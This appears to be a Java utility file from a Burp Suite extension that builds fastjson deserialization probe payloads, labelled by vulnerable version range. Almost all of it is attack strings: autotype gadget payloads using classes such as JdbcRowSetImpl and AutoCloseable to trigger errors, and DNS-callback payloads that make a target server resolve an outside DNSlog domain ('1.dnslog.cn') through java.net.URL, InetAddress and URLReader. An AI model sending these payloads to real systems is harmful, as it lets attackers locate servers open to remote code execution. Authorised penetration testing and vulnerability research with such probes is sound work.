package burp.util;

import java.util.ArrayList;

/**
 * @DESCRIPTION:
 * @USER: f0ng
 * @DATE: 2024/2/21 下午1:06
 */
public class fastjsontest {
    public static void main(String[] args) {

        // fastjson<=1.2.24以及fastjson=1.2.83
        String fastjson_baocuo_7 = "{\"page\":{\"pageNumber\":1,\"pageSize\":1,\"zero\":{\"@type\":\"java.lang.Exception\"," +
                "\"@type\":\"org.XxException\"}}}";

        // fastjson<=1.2.68
        String fastjson_baocuo_8 = "{\"page\":{\"pageNumber\":1,\"pageSize\":1,\"zero\":{\"@type\":\"java.lang" +
                ".AutoCloseable\",\"@type\":\"java.io.ByteArrayOutputStream\"}}}";

        // 1.2.9<=fastjson<=1.2.47
        String fastjson_baocuo_9 = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," +
                "\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"}}";

        // fastjson<=1.2.47
        String fastjson_baocuo_10 = "{\"zero\": {\"@type\": \"com.sun.rowset.JdbcRowSetImpl\"}}";

        getfastjsonDnslog("1.dnslog.cn");


    }

    public static ArrayList<String> getfastjsonDnslog(String dnslog){

        ArrayList<String> stringList = new ArrayList<String>();

        // 1.2.9-1.2.83
        String fastjson_dns_1 = "Set[{\"@type\":\"java.net.URL\",\"val\":\"http://dayu9.{{URL}}\"}";

        // 1.2.9-1.2.47
        String fastjson_dns_2 = "{\"name\":{\"@type\":\"java.net.InetAddress\",\"val\":\"dayu9xiaoyu47.{{URL}}\"}}";


        // 1.2.37-1.2.68
        String fastjson_dns_3 = "{\"a\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.alibaba.fastjson" +
                ".JSONReader\",\"reader\":{\"@type\":\"jdk.nashorn.api.scripting.URLReader\",\"url\":\"http://dayu37xiaoyu68" +
                ".{{URL}}\"}}}";

        // 1.2.9-1.2.68
        String fastjson_dns_4 = "[{\"@type\": \"java.lang.AutoCloseable\",\"@type\": \"java.io" +
                ".ByteArrayOutputStream\"},{\"@type\": \"java.io.ByteArrayOutputStream\"},{\"@type\": \"java.net" +
                ".InetSocketAddress\"{\"address\":,\"val\": \"dayu9xiaoyu68.{{URL}}\"}}]";

        // 1.2.9<=fastjson<=1.2.24以及1.2.40<=fastjson<=1.2.47
        String fastjson_dns_5 = "[{\"@type\":\"java.lang.Class\",\"val\":\"java.io.ByteArrayOutputStream\"}," +
                "{\"@type\":\"java.io.ByteArrayOutputStream\"},{\"@type\":\"java.net" +
                ".InetSocketAddress\"{\"address\":,\"val\":\"dayu9xiaoyu24ordayu40xiaoyu47.{{URL}}\"}}]";

        // fastjson>=1.2.9以及fastjson=1.2.83
        String fastjson_dns_6 = "[{\"@type\":\"java.lang.Exception\",\"@type\":\"com.alibaba.fastjson" +
                ".JSONException\",\"x\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"dayu9" +
                ".{{URL}}\"}}},{\"@type\":\"java.lang.Exception\",\"@type\":\"com.alibaba.fastjson.JSONException\"," +
                "\"message\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"83.{{URL}}\"}}}]";

        stringList.add(fastjson_dns_1);
        stringList.add(fastjson_dns_2);
        stringList.add(fastjson_dns_3);
        stringList.add(fastjson_dns_4);
        stringList.add(fastjson_dns_5);
        stringList.add(fastjson_dns_6);

        for ( String i :stringList){
            System.out.println(i.replace("{{URL}}",dnslog));
            
        }
        return stringList;

    }


}
